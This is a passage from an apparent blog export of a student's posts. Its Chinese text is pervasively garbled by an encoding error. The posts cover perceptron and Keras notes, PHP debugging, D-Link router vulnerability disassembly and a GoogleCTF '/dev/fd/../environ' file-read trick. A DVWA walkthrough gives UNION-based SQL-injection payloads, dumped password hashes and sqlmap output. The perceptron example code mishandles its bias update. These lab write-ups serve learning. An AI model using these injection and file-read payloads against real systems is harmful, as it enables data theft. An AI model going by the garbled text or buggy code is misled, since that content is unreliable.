    <content type="text"><![CDATA[æ„ŸçŸ¥æœºè¡¥å…… æŽ¥ç€å†™ æ„ŸçŸ¥æœºçš„è®­ç»ƒä¸­ï¼Œè€å¸ˆè¿˜æä¾›äº†ä¸€éƒ¨ä»½èµ„æ–™ï¼Œæ¯”å¦‚è®­ç»ƒå‡º$y=2x$ æˆ‘ä»¬ç®€è¦åœ°çœ‹ä¸€ä¸‹ä¸€æ¬¡è®­ç»ƒçš„ç»“æžœï¼š bias x y w0 w1 yout y-yout adj0 adj1 alpha w0new w1new 1 0.512 1.023 0.719 0.403 0.926 0.977 0.977 0.500 0.7 0.788 0.438 è¿›è¡Œå¾ˆå¤šæ¬¡è®­ç»ƒä¹‹åŽç”»å‡ºçš„å›¾å½¢ï¼š é¢„æµ‹çš„è¿˜æ˜¯æŒºå‡†ç¡®çš„ ä¸ºä»€ä¹ˆéœ€è¦biasï¼Ÿ æ¦‚å¿µä¸Šå¾ˆå¥½ç†è§£ï¼Œbiaså°±æ˜¯å°†ä¸€ä¸ªæ­£æ¯”ä¾‹å‡½æ•°å˜ä¸ºäº†ä¸€æ¬¡å‡½æ•°ï¼Œè¿™æ ·ä¸å¿…æ¯æ¬¡éƒ½è¿‡åŽŸç‚¹ï¼Œåˆ†ç±»çš„å‡†ç¡®æ€§ä¹Ÿå°±å¤§å¤§åœ°æé«˜äº† å¤šå±‚æ„ŸçŸ¥æœº ä¸€å±‚çš„æ„ŸçŸ¥æœºæ˜¯æ²¡åŠžæ³•å¤„ç†å¼‚æˆ–é—®é¢˜çš„ æ‰€ä»¥éœ€è¦å¢žåŠ éšè—å±‚ å°±åƒä¸‹é¢è¿™æ ·ï¼š è¿™æ ·å°±å¯ä»¥åšåˆ°äº†ï¼š æ„Ÿè§‰MLPçš„æ•°å­¦çŸ¥è¯†å¤ªè¿‡å¤æ‚äº†ï¼Œæš‚æ—¶æ”¾ç€ keras ä»Žæ —å­ä»£ç å¼€å§‹ï¼š 12345678910111213141516171819202122from keras.models import Sequentialmodel = Sequential()from keras.layers import Dense'''ä½¿ç”¨addæ¥å †å æ¨¡åž‹'''model.add(Dense(units=64, activation='relu', input_dim=100))model.add(Dense(units=10, activation='softmax'))'''ä½¿ç”¨compileæ¥é…ç½®å­¦ä¹ è¿‡ç¨‹'''model.compile(loss='categorical_crossentropy', optimizer='sgd', metrics=['accuracy'])# x_train å’Œ y_train æ˜¯ Numpy æ•°ç»„ -- å°±åƒåœ¨ Scikit-Learn API ä¸­ä¸€æ ·ã€‚model.fit(x_train, y_train, epochs=5, batch_size=32)'''è¯„ä¼°æ¨¡åž‹'''loss_and_metrics = model.evaluate(x_test, y_test, batch_size=128)classes = model.predict(x_test, batch_size=128) Sequential compile åœ¨è®­ç»ƒæ¨¡åž‹ä¹‹å‰ï¼Œéœ€è¦é…ç½®å­¦ä¹ è¿‡ç¨‹ï¼ŒcompileæŽ¥æ”¶ä¸‰ä¸ªå‚æ•° ä¼˜åŒ–å™¨optimizer æŸå¤±å‡½æ•°loss è¯„ä¼°æ ‡å‡†metrics ä¸€ä¸ªä¸ªæ¥çœ‹ ä¼˜åŒ–å™¨ å¯ä»¥å…ˆå®žä¾‹åŒ–ä¸€ä¸ªä¼˜åŒ–å™¨å¯¹è±¡ï¼Œç„¶åŽå°†å®ƒä¼ å…¥model.compile()ï¼Œæˆ–è€…å¯ä»¥é€šè¿‡ æŸå¤±å‡½æ•° æŸå¤±å‡½æ•°ï¼ˆæˆ–ç§°ç›®æ ‡å‡½æ•°ã€ä¼˜åŒ–è¯„åˆ†å‡½æ•°ï¼‰æ˜¯ç¼–è¯‘æ¨¡åž‹æ—¶æ‰€éœ€çš„ä¸¤ä¸ªå‚æ•°ä¹‹ä¸€ï¼š 1model.compile(loss='mean_squared_error', optimizer='sgd') æˆ‘ä»¬å¯ä»¥ä¼ é€’ä¸€ä¸ªçŽ°æœ‰çš„æŸå¤±å‡½æ•°åï¼Œæˆ–è€…ä¸€ä¸ªtensorflowç¬¦å·å‡½æ•°ï¼Œæœ‰ä»¥ä¸‹ä¸¤ä¸ªå‚æ•° y_true: çœŸå®žæ ‡ç­¾. y_pred: é¢„æµ‹å€¼,å…¶shapeä¸Žy_trueç›¸åŒ å¯ç”¨çš„æŸå¤±å‡½æ•°ï¼š mean_squared_error mean_absolute_error ç­‰ å‚è€ƒ ç¥žç»ç½‘ç»œä¸­w,bå‚æ•°çš„ä½œç”¨ï¼ˆä¸ºä½•éœ€è¦åç½®bçš„è§£é‡Šï¼‰ æ·±åº¦å­¦ä¹ ä¸­åç§»é¡¹biasçš„ä½œç”¨]]></content>
      <categories>
        <category>deep learning</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[deep learning0]]></title>
    <url>%2F2019%2F07%2F21%2Fdeep-learning0%2F</url>
    <content type="text"><![CDATA[deep learning æ•´ç†ä¸€ä¸‹ä¸Šè¯¾çš„ç¬”è®°ï¼Œä¸ç„¶å…¨éƒ½ä¼šå¿˜äº†åŽ» æ— ç›‘ç£å­¦ä¹  self organizing map ç®€ç§°SOMç®—æ³• å¤§æ„ï¼šç»™å®šä¸€ä¸ªå‘é‡$v_{k}$,å¯»æ‰¾åˆ°è·ç¦»æœ€è¿‘çš„ç¥žç»å…ƒ æ‰¾åˆ°æœ€æŽ¥è¿‘çš„ç¥žç»å…ƒ $$n_{bmu}=\underset{1\leqslant i\leqslant m}{argmin}\left | v_{k}-n_{i} \right |$$ æ›´æ–°$n_{i}$ wikipediaä¸Šä¸€å¼ å¾ˆå½¢è±¡çš„å›¾ç‰‡: è“è‰²æ–‘ç‚¹æ˜¯è®­ç»ƒæ•°æ®çš„åˆ†å¸ƒï¼Œå°ç™½è‰²å…‰ç›˜æ˜¯ä»Žè¯¥åˆ†å¸ƒä¸­æŠ½å–çš„å½“å‰è®­ç»ƒæ•°æ®ã€‚é¦–å…ˆï¼ˆå·¦ï¼‰ï¼ŒSOMèŠ‚ç‚¹ä»»æ„åœ°ä½äºŽæ•°æ®ç©ºé—´ä¸­ã€‚é€‰æ‹©æœ€æŽ¥è¿‘è®­ç»ƒåŸºå‡†çš„èŠ‚ç‚¹ï¼ˆä»¥é»„è‰²çªå‡ºæ˜¾ç¤ºï¼‰ã€‚å®ƒè¢«ç§»å‘è®­ç»ƒæ•°æ®ï¼Œå› ä¸ºï¼ˆåœ¨è¾ƒå°ç¨‹åº¦ä¸Šï¼‰æ˜¯å®ƒåœ¨ç½‘æ ¼ä¸Šçš„é‚»å±…ã€‚åœ¨å¤šæ¬¡è¿­ä»£ä¹‹åŽï¼Œç½‘æ ¼å€¾å‘äºŽè¿‘ä¼¼æ•°æ®åˆ†å¸ƒï¼ˆå³ï¼‰ã€‚ æœ‰ç›‘ç£å­¦ä¹  æ•°å­¦çŸ¥è¯† ç‰¹å¾å‘é‡ çº¿æ€§ä»£æ•°ä¸­çš„ç‰¹å¾å‘é‡ï¼š å¯¹äºŽä¸€ä¸ªç»™å®šçš„æ–¹é˜µAï¼Œå®ƒçš„ç‰¹å¾å‘é‡vç»è¿‡çº¿æ€§å˜åŒ–ä¹‹åŽï¼Œå¾—åˆ°çš„æ–°å‘é‡ä»ç„¶ä¸ŽåŽŸæ¥çš„vä¿æŒåœ¨åŒä¸€æ¡ç›´çº¿ä¸Šï¼Œä½†å…¶é•¿åº¦æˆ–æ–¹å‘ä¹Ÿè®¸ä¼šæ”¹å˜ï¼Œå³ï¼š $$Av=\lambda v$$ æ­¤æ—¶$v$å°±æ˜¯çŸ©é˜µ$A$çš„ç‰¹å¾å‘é‡ï¼Œ$\lambda$å°±æ˜¯å¯¹åº”çš„ç‰¹å¾å€¼ è¿›ä¸€æ­¥ï¼šåœ¨ä¸€å®šæ¡ä»¶ä¸‹ï¼Œä¸€ä¸ªå˜æ¢å¯ä»¥ç”±å…¶ç‰¹å¾å€¼ç‰¹å¾å‘é‡å®Œå…¨è¡¨è¿°ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ‰€æœ‰çš„ç‰¹å¾å‘é‡ç»„æˆäº†è¿™å‘é‡ç©ºé—´çš„ä¸€ç»„åŸºåº•ã€‚ ä¸€ä¸ªç‰¹å¾ç©ºé—´æ˜¯å…·æœ‰ç›¸åŒç‰¹å¾å€¼çš„ç‰¹å¾å‘é‡ä¸Žä¸€ä¸ªåŒç»´æ•°çš„é›¶å‘é‡çš„é›†åˆï¼Œæ¯”å¦‚$E_{\lambda }=\left { u\in V | Au=\lambda u\right }$å³ä¸ºçº¿æ€§å˜åŒ–$A$ä¸­ä»¥$\lambda$ä¸ºç‰¹å¾å€¼çš„ç‰¹å¾ç©ºé—´ æŠ½è±¡æ¦‚å¿µä¸å®¹æ˜“ç†è§£ï¼Œä¸¾å‡ ä¸ªæ —å­ï¼š æ’ç­‰å˜æ¢$I$çš„ç‰¹å¾å‘é‡ $$I(v)=v=1\cdot v$$ å¯ä»¥çœ‹åˆ°æ‰€æœ‰çš„ç‰¹å¾å‘é‡éƒ½æ˜¯æ’ç­‰å˜æ¢$I$çš„ç‰¹å¾å‘é‡ï¼Œæ’ç­‰å˜æ¢çš„ç‰¹å¾ç©ºé—´åªæœ‰ä¸€ä¸ªå°±æ˜¯æ•´ä¸ªç©ºé—´ ç±»ä¼¼çš„ï¼Œæ•°ä¹˜å˜æ¢$\lambda I$çš„ç‰¹å¾å‘é‡ä¹Ÿæ˜¯æ‰€æœ‰çš„éžé›¶å‘é‡ï¼Œå› ä¸ºæŒ‰ç…§å®šä¹‰ï¼š $$\lambda I(v) = \lambda \cdot v$$ æ„ŸçŸ¥å™¨ çœ‹å¼ å›¾ï¼š æ•°å­¦è¡¨è¿°ä¸ºï¼š$t = f(\sum {i=1}^{n} w{i}x_{i} + b) = f(\mathbf{w}^{T} \mathbf{x})$ få‡½æ•°çš„è¡¨è¾¾å¼ï¼š $$f(x) = \left{\begin{matrix} 1 &amp; if , w \cdot x + b &gt; 0 \ 0 &amp; else \end{matrix}\right.$$ $\mathbf{x} = \left [ x_{1}, x_{2} ... , x_{n} , \ 1 \right]^{T}$, $\mathbf{w} = \left [ w_{1}, w_{2} , ...w_{n} , \ b \right]^{T}$ å¦‚ä½•è®­ç»ƒï¼Ÿ æˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªè®­ç»ƒä¸Žè¿ç®—çš„demo 123456789101112131415161718192021222324252627282930313233343536373839404142434445import numpy as npdef load_data(): ''' åŠ è½½æ•°æ®ï¼Œinput_dataå’Œlabelså¯¹åº” ''' input_data = [[1, 1], [0, 0], [1, 0], [0, 1]] labels = [1, 0, 0, 0] return input_data, labelsdef train_pre(input_data, y, iteration, rate): ''' è®­ç»ƒï¼Œæ›´æ–°wå’Œb ''' unit_step = lambda x: 0 if x &lt; 0 else 1 w = np.random.rand(len(input_data[0])) bias = 0.0 for i in range(iteration): samples = zip(input_data, y) for (input_i, label) in samples: result = input_i * w + bias result = float(sum(result)) y_pred = float(unit_step(result)) w = w + rate * (label - y_pred) * np.array(input_i) bias = rate * (label - y_pred) return w, biasdef predict(input_i, w, b): ''' é¢„æµ‹ ''' unit_step = lambda x: 0 if x &lt; 0 else 1 result = input_i * w + b result = sum(result) y_pred = float(unit_step(result)) print(y_pred)if __name__ == "__main__": input_data, y = load_data() w, b = train_pre(input_data, y, 20, 0.01) predict([1, 1], w, b) æˆ‘ä»¬å¾ˆæƒŠè®¶åœ°å‘çŽ°ä¸€ä¸ªå¦‚æ­¤ç®€å•åœ°æ¨¡åž‹ç«Ÿç„¶ä¸å¯æ€è®®åœ°å®Œæˆäº†è¿™ä¸ªä»»åŠ¡ã€‚ æ•°æ®æ›´æ–°ï¼š $w(j) := w(j) + \alpha (y-f(x))x(j) (j = 1,...n)$ å¼‚æˆ–é—®é¢˜ å½“æ—¶è€å¸ˆä¸Šè¯¾æ—¶å€™æåˆ°å¼‚æˆ–é—®é¢˜æ˜¯ä¸å¯è§£çš„ï¼ŒåŽæ¥æŸ¥äº†ä¸€ä¸‹èµ„æ–™æ‰æ˜Žç™½åœ¨ç¥žç»ç½‘ç»œå‘å±•çš„æ—©æœŸï¼Œå¼‚æˆ–é—®é¢˜ç¡®å®žæ˜¯ä¸å¯è§£çš„ï¼Œä¸è¿‡é€šè¿‡åŠ å…¥éšè—å±‚ä½¿å¾—å¼‚æˆ–é—®é¢˜èƒ½å¤Ÿæœ‰äº†æ–°çš„è§£æ³• å¦‚ä¸‹å›¾ï¼š å¤ä¹ çš„æ—¶å€™æ‰æ³¨æ„åˆ°åŽŸæ¥è€å¸ˆæåˆ°äº†é€šè¿‡åŠ å…¥éšè—å±‚çš„æ–¹å¼æ¥è§£å†³å¼‚æˆ–é—®é¢˜ å‚è€ƒèµ„æ–™ ã€æœºå™¨å­¦ä¹ ã€‘ç¥žç»ç½‘ç»œå®žçŽ°å¼‚æˆ–ï¼ˆXORï¼‰ 1.5 å›¾å½¢åŒ–ç†è§£ç¥žç»ç½‘ç»œä¸­çš„å¼‚æˆ–é—®é¢˜ æ„ŸçŸ¥å™¨ wikipedia]]></content>
      <categories>
        <category>deep learning</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[ä»ŽGooglectfä¸€é“é¢˜è®¤è¯†ä¸€ä¸‹é“¾æŽ¥æ–‡ä»¶]]></title>
    <url>%2F2019%2F07%2F21%2F%E4%BB%8EGooglectf%E4%B8%80%E9%81%93%E9%A2%98%E8%AE%A4%E8%AF%86%E4%B8%80%E4%B8%8B%E9%93%BE%E6%8E%A5%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[Linuxç›®å½• æºè‡ªGooglectf2017çš„ä¸€é“é¢˜ å¯ä»¥é€šè¿‡få‚æ•°ç›´æŽ¥è¯»å–åˆ°æƒ³è¯»çš„æ–‡ä»¶ flagè—åœ¨ /proc/environä¸­ï¼Œæ€Žä¹ˆæ‰èƒ½è¿›å…¥åˆ°è¿™ä¸ªç›®å½•ï¼Ÿ Linuxä¸­æœ‰ä¸€ä¸ªå«åšsymlink method ä¹Ÿå°±æ˜¯ç›¸å½“äºŽä¸€ä¸ªå¿«æ·æ–¹å¼ï¼Œä½†æ˜¯å´ä¸åŒäºŽWindowsä¸­çš„shortcut è€Œæ­£å¥½ï¼š/dev/fdè¿™ä¸ªæŒ‡å‘äº†/proc/self/fdè¿™æ ·payloadå°±ä¸éš¾ç†è§£äº†ï¼š /dev/fd/../environ è®¿é—®/dev/fdå°±ç›¸å½“äºŽè®¿é—®äº†/proc/selfä¹‹åŽå›žé€€ä¸€æ¬¡å°±å¯ä»¥æ‰¾åˆ°environè¿™ä¸ªæ–‡ä»¶äº† Linuxä¸­ /dev/fd/0è¿è¡Œæ•ˆæžœæ˜¯è¿™æ ·çš„ï¼Œç›¸å½“äºŽä½ è¾“å…¥å•¥å®ƒå°±ä¼šå›žç­”å•¥ 12345 âœ˜ pxy@LAPTOP-UBIEP4K5 ~ sudo cat /dev/fd/0aapxypxy æŽ¥ä¸‹æ¥äº†è§£ä¸€ä¸‹lnå‘½ä»¤ è½¯é“¾æŽ¥ï¼šè‹±æ–‡symbolic linkéžå¸¸ç±»ä¼¼äºŽWindowsä¸­çš„å¿«æ·æ–¹å¼ ç¡¬é“¾æŽ¥ï¼šè‹±æ–‡hard linkè¿™ç±»æ–‡ä»¶ä¼šæ‹¥æœ‰è‡ªå·±çš„inodeèŠ‚ç‚¹å’Œåç§°ï¼Œå…¶inodeä¼šæŒ‡å‘æ–‡ä»¶å†…å®¹æ‰€åœ¨çš„æ•°æ®å—emmmåŽé¢ä¸æ˜¯å¾ˆæ‡‚äº† å»ºç«‹è½¯é“¾æŽ¥çš„æ–¹å¼ï¼š ln -s æºæ–‡ä»¶åç§° è½¯é“¾æŽ¥æ–‡ä»¶åç§° ç›®å½•å’Œæ–‡ä»¶å‡å¯ çŽ°åœ¨å½“å‰å—ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªæŒ‡å‘/proc/sysçš„é“¾æŽ¥ ç„¶åŽæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ç›®å½•éåŽ†æ¥è¿›å…¥åˆ°å…¶ä»–çš„ç›®å½•äº†ã€‚ è½¯é“¾æŽ¥è¿˜ä¼šå­˜åœ¨è¿™ä¸ªé—®é¢˜ï¼š é“¾æŽ¥çš„é‡å¤å®šä¹‰ è¿™æ ·å°±ä¸ä¼šå‡ºé—®é¢˜äº†ï¼ŒåŠ ä¸ª-né€‰é¡¹ å‚è€ƒ]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vscodeè°ƒè¯•php]]></title>
    <url>%2F2019%2F07%2F21%2Fvscode%E8%B0%83%E8%AF%95php%2F</url>
    <content type="text"><![CDATA[ä½¿ç”¨vscodeè°ƒè¯•phpä»£ç  ä¸‹è½½xdebug å®˜ç½‘ ä½†æ˜¯éœ€è¦è‡ªå·±ç¡®å®šphpçš„ç‰ˆæœ¬å’Œç¼–è¯‘å™¨çš„ç‰ˆæœ¬ ä½†æ˜¯å®˜ç½‘çš„é“¾æŽ¥ä¼¼ä¹Žæœ‰é—®é¢˜ï¼Œphp5.5çš„ä¸¤ä¸ªåè¿‡æ¥äº† ä¹‹åŽå°†å…¶æ·»åŠ åˆ°php.iniæ–‡ä»¶ä¸­ 1234[XDebug]zend_extension = php_xdebug-2.5.5-5.5-vc11.dllxdebug.remote_enable = 1xdebug.remote_autostart = 1 å°†phpæ·»åŠ åˆ°çŽ¯å¢ƒå˜é‡ä¸­ è¿™å°±ä¸ç»†è¯´äº† é…ç½®vscodeä¸­çš„phpè·¯å¾„ åœ¨settings.jsonä¸­æŒ‡å®š è°ƒè¯• è¸©åˆ°çš„å‘ VScodeçš„php debugæ’ä»¶é»˜è®¤æ˜¯ç”¨çŽ¯å¢ƒå˜é‡ä¸­çš„phpæ¥è¿›è¡Œè°ƒè¯•çš„ï¼Œæ‰€ä»¥phpå¦‚æžœæ²¡æœ‰åŠ å…¥åˆ°çŽ¯å¢ƒå˜é‡ä¸­çš„è¯æ˜¯ä¼šæŠ¥é”™çš„ã€‚ æˆ‘åˆšå¼€å§‹ç”¨äº†wampserverçš„phpæ¥è¿›è¡Œè°ƒè¯•ï¼Œä½†æ˜¯åŽæ¥å¤±è´¥äº†ï¼Œè¯´æ˜¯æ²¡åŠžæ³•åŠ è½½xdebugæ’ä»¶ï¼Œæ‰€ä»¥æ¢æˆäº†phpstudy æ‰¾ä¸åˆ°settingæ–‡ä»¶ï¼Ÿè¿™ä¸ªå‘å®³æƒ¨äº† åœ¨è¿™ä¸ªåœ°æ–¹éœ€è¦æ·»åŠ phpçš„è·¯å¾„ ä¸¤ç§è°ƒè¯•æ–¹å¼ï¼Œä¸€ç§æ˜¯listen for xdebugï¼Œéœ€è¦æ‰“å¼€æµè§ˆå™¨ï¼Œå¦ä¸€ç§æ˜¯launch currently open script]]></content>
      <categories>
        <category>config</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>vscode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IOT D-link]]></title>
    <url>%2F2019%2F07%2F20%2FIOT-D-link%2F</url>
    <content type="text"><![CDATA[DIR-815æ ˆæº¢å‡ºæ¼æ´ž å±¡æ¬¡è°ƒè¯•éƒ½å¤±è´¥äº†ï¼Œæˆ‘æ‰å‘çŽ°åŽŸæ¥è¿™ä¸ªç‰ˆæœ¬çš„DIR-815å·²ç»ä¿®å¤äº†(DIR-815_REVB_FIRMWARE_2.03.B08)ã€‚ æ‰€ä»¥è¿™ä¸ªæ ˆæº¢å‡ºæ˜¯ä¸å­˜åœ¨çš„ 123456789.text:0040BE04 move $a3, $s2.text:0040BE08 la $a2, aSSPostxml # &quot;%s/%s/postxml&quot;.text:0040BE0C move $a0, $s1 # s.text:0040BE10 li $a1, 0x400 # maxlen.text:0040BE14 jalr $t9 ; snprintf.text:0040BE18 sw $v0, 0x4F0+var_4E0($sp).text:0040BE1C lw $gp, 0x4F0+var_4D8($sp).text:0040BE20 move $a2, $s1.text:0040BE24 la $t9, xmldbc_del DIR-645 ç¼“å†²åŒºæº¢å‡ºæ¼æ´ž åŠ¨æ€è°ƒè¯•ï¼š åœ¨authenticationcgi_mainå¤„ä¸‹æ–­ç‚¹ æ­¤æ—¶è¿”å›žåœ°å€ä¿å­˜åœ¨è¿™é‡Œï¼š ä¹‹åŽè¿è¡Œåˆ°æ­¤å¤„ï¼š æ­¤æ—¶è¿”å›žåœ°å€è¢«è¦†ç›–äº† ç»§ç»­è¿è¡Œï¼Œç¨‹åºæžœç„¶å´©æºƒäº† è¿›å…¥åˆ°å‡½æ•°sub40A424 ç¨‹åºåœ¨æ­¤æ—¶å´©æºƒäº† å°è¯•ä¿®æ”¹passwordé•¿åº¦ ç¨‹åºè¿˜æ˜¯å´©æºƒäº† æŸ¥çœ‹åæ±‡ç¼–ä»£ç  ç¨‹åºä»Žå¤–éƒ¨è¯»å…¥CONTENT_LENGTHæ²¡æœ‰è¿›è¡Œä»»ä½•æ£€æŸ¥ 12345678910111213141516171819202122232425text:0040B4A0 la $t9, getenv.text:0040B4A4 la $a0, aContent_length # &quot;CONTENT_LENGTH&quot;.text:0040B4A8 jalr $t9 ; getenv.text:0040B4AC move $s0, $v0.text:0040B4B0 lw $gp, 0xF90+var_F78($sp).text:0040B4B4 beqz $s0, loc_40B610.text:0040B4B8 addiu $a0, $sp, 0xF90+var_938.text:0040B4BC beqz $v0, loc_40B614.text:0040B4C0 addiu $a1, $sp, 0xF90+var_E1C.text:0040B4C4 la $t9, atoi.text:0040B4C8 nop.text:0040B4CC jalr $t9 ; atoi.text:0040B4D0 move $a0, $v0 # nptr.text:0040B4D4 lw $gp, 0xF90+var_F78($sp).text:0040B4D8 move $s0, $v0.text:0040B4DC la $v1, stdin.text:0040B4E0 la $t9, fileno.text:0040B4E4 lw $a0, (stdin - 0x4353CC)($v1) # stream.text:0040B4E8 jalr $t9 ; fileno.text:0040B4EC addiu $s1, $sp, 0xF90+var_430.text:0040B4F0 lw $gp, 0xF90+var_F78($sp).text:0040B4F4 move $a0, $v0 # fd.text:0040B4F8 la $t9, read.text:0040B4FC move $a1, $s1 # buf.text:0040B500 jalr $t9 ; read è®¡ç®—åç§»é‡ï¼› åŽé¢çš„åˆ©ç”¨è¿‡ç¨‹æ„Ÿè§‰æ¯”è¾ƒå¤æ‚ï¼Œæ²¡èƒ½æˆåŠŸåœ°å¤çŽ° DIR-645å‘½ä»¤æ‰§è¡Œæ¼æ´ž åœ¨å®‰å…¨å®¢ä¸Šçœ‹åˆ°äº†ä¸€ç¯‡åˆ†æžDIR-645å‘½ä»¤æ‰§è¡Œåœ°æ–‡ç« ï¼Œéšåˆ†æžä¸€ä¸‹åŽŸç† ç›´æŽ¥æŸ¥çœ‹servicecgi_mainå‡½æ•° é¦–å…ˆä¼šå¯¹è¯·æ±‚æ–¹æ³•è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æžœæ˜¯POSTæ–¹æ³•åˆ™ä¼šè°ƒç”¨cgibin_parse_requestè§£æžå‚æ•°ï¼Œå…·ä½“çš„å®žçŽ°æš‚æ—¶ä¸è€ƒè™‘ï¼Œä¸»è¦æ˜¯è§£æžCONTENT_TYPEå’ŒCONTENT_LENGTH,ä¹‹åŽä¼šè°ƒç”¨sess_ispoweruseråˆ¤æ–­æ˜¯å¦ä¸ºåˆæ³•ç”¨æˆ· ä¹‹åŽèŽ·å– POST è¡¨å•å­—æ®µï¼Œè‹¥å­—æ®µåä¸º EVENT çš„è¯ï¼Œå°±å°† &quot;event %s &gt; /dev/null&quot; ä½œä¸ºå‚æ•°æ‰§è¡Œ lxmldbc_system å‡½æ•°ã€‚ æŸ¥çœ‹lxmldbc_systemå‡½æ•° 123456789sw $a1, 0x428+arg_4($sp)sw $a2, 0x428+arg_8($sp)sw $a3, 0x428+arg_C($sp)move $a2, $a0 # formatmove $a3, $v0 # argmove $a0, $s0 # ssw $v0, 0x428+var_410($sp)jalr $t9 ; vsnprintf li $a1, 0x400 # maxlen ä¸»è¦å…³æ³¨æœ€åŽä¸¤æ¡æŒ‡ä»¤ï¼Œå› ä¸ºè¿™é‡Œç”¨åˆ°äº†MIPSä¸­åœ°åˆ†æ”¯å»¶è¿Ÿæ§½æŠ€æœ¯ï¼Œæ‰€ä»¥$a1ä¼ é€’å‚æ•°çš„æŒ‡ä»¤å­˜æ”¾åœ¨jalræŒ‡ä»¤ä¹‹åŽ æ•…vsnprintf($sp+0x428+var_40C,0x400,&quot;event %s &gt; /dev/null&quot;,arg_4) vsnprintfå‡½æ•°çš„ç”¨æ³•ï¼š å‡½æ•°åŽŸåž‹ï¼šint vsnprintf(char str, size_t size, const char format,va_list ap); å‡½æ•°è¯´æ˜Žï¼šå°†å¯å˜å‚æ•°æ ¼å¼åŒ–è¾“å‡ºåˆ°ä¸€ä¸ªå­—ç¬¦æ•°ç»„ å‚æ•°ï¼šstrè¾“å‡ºåˆ°çš„æ•°ç»„ï¼ŒsizeæŒ‡å®šå¤§å°ï¼Œé˜²æ­¢è¶Šç•Œï¼Œformatæ ¼å¼åŒ–å‚æ•°ï¼Œapå¯å˜å‚æ•°åˆ—è¡¨å‡½æ•°ç”¨æ³• æŽ¥ç€è°ƒç”¨systemå‡½æ•° 12jalr $t9 ; systemmove $a0, $s0 # command çœ‹ä¸€ä¸‹å‚æ•°çš„ä¼ é€’è¿‡ç¨‹ $s0æœ¬æ¥æ˜¯æ ˆä¸Šçš„ä¸€ä¸ªå˜é‡ï¼Œvsnprintfå°†å¯å˜å‚æ•°æ ¼å¼åŒ–è¾“å‡ºåˆ°å…¶ä¸­ï¼Œä¹‹åŽåˆå°†å…¶ä½œä¸ºå‚æ•°ä¼ é€’ç»™systemå‡½æ•° ç›¸å½“äºŽæ‰§è¡Œäº† system(&quot;event %s &gt; /dev/null&quot;) è¿™æ ·å°±å¯ä»¥æƒ³åŠžæ³•è¿›è¡Œå‘½ä»¤æ³¨å…¥äº† å‚è€ƒ è·¯ç”±å™¨æ¼æ´žæŒ–æŽ˜ä¹‹ DIR-815 æ ˆæº¢å‡ºæ¼æ´žåˆ†æž]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWAå­¦ä¹ ]]></title>
    <url>%2F2019%2F07%2F20%2FDVWA%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[DVWA ç”¨çš„vulstudyçš„çŽ¯å¢ƒ é»˜è®¤ç”¨æˆ·åæ˜¯adminå¯†ç æ˜¯password éœ€è¦å¯åŠ¨çš„æ—¶å€™docker-compose up -då°±è¡Œäº† åœæ­¢çš„è¯docker-compose stopåœæ­¢å®¹å™¨ sqlæ³¨å…¥ æœ€ç®€å•çš„ æ²¡åŠžæ³•æ˜¯æˆ‘å¤ªèœäº†ï¼Œæƒå½“å¤ä¹ å¥½äº† ðŸ˜¢ è¾“å…¥1å¾—åˆ°ï¼š 123ID: 1First name: adminSurname: admin ç„¶åŽå¼€å§‹çˆ†å­—æ®µ 1' order by 2 # ç¡®è®¤å›žæ˜¾ä½ç½®ï¼š 1' union select 1,2 # 123ID: 1&apos; union select 1,2 #First name: 1Surname: 2 å¼€å§‹çˆ†æ•°æ®åº“ 1' union select database(),2 # å¾—åˆ°æ•°æ®åº“å 123ID: 1&apos; union select database(),2 #First name: dvwaSurname: 2 å¼€å§‹çˆ†è¡¨ è¡¨éƒ½å­˜åœ¨information_schema.tablesè¿™é‡Œé¢ 1' union select table_name,2 from information_schema.tables where table_schema= 'dvwa'# å¾—åˆ°ï¼š 123456ID: 1&apos; union select table_name,2 from information_schema.tables where table_schema= &apos;dvwa&apos;#First name: guestbookSurname: 2ID: 1&apos; union select table_name,2 from information_schema.tables where table_schema= &apos;dvwa&apos;#First name: usersSurname: 2 å¼€å§‹çˆ†å­—æ®µ ç„¶è€Œæˆ‘å¹¶ä¸çŸ¥é“æ€Žä¹ˆçˆ†å­—æ®µðŸ˜ž äºŽæ˜¯çŒœæµ‹æ˜¯password 1' union select password,2 from users å¾—åˆ°äº†ï¼š 123456789101112ID: 1&apos; union select password, 2 from users #First name: 5f4dcc3b5aa765d61d8327deb882cf99Surname: 2ID: 1&apos; union select password, 2 from users #First name: e99a18c428cb38d5f260853678922e03Surname: 2ID: 1&apos; union select password, 2 from users #First name: 8d3533d75ae2c3966d7e0d4fcc69216bSurname: 2ID: 1&apos; union select password, 2 from users #First name: 0d107d09f5bbe40cade3de5c71e9e9b7Surname: 2 å°ç™½ä¹‹æ—…åˆ°æ­¤ç»“æŸ å‡çº§åˆ°medium æ”¹æˆäº†postæ–¹å¼æäº¤æ•°æ® è¿™æ—¶å€™sqlmapæ´¾ä¸Šç”¨åœºäº† å…ˆå°†æŠ“åˆ°çš„æ•°æ®åŒ…ä¿å­˜ä¸ºdvwa.txtæ–‡ä»¶ ç„¶åŽ python sqlmap.py -r &quot;dvwa.txt&quot; --dbs sqlmapå¾ˆèªæ˜Žçš„åˆ¤æ–­å‡ºè¿™æ˜¯MYSQLæ•°æ®åº“å¹¶ä¸”åˆ—å‡ºäº†æ‰€æœ‰çš„æ•°æ®åº“ 123456[22:21:04] [INFO] fetching database namesavailable databases [4]:[*] dvwa[*] information_schema[*] mysql[*] performance_schema ä¸è¿‡è¿™ä¸ªpayloadå¾ˆç¥žå¥‡ 12345678910111213141516Parameter: id (POST) Type: boolean-based blind Title: Boolean-based blind - Parameter replace (original value) Payload: id=(SELECT (CASE WHEN (1900=1900) THEN 1 ELSE (SELECT 6858 UNION SELECT 6800) END))&amp;Submit=Submit Type: error-based Title: MySQL &gt;= 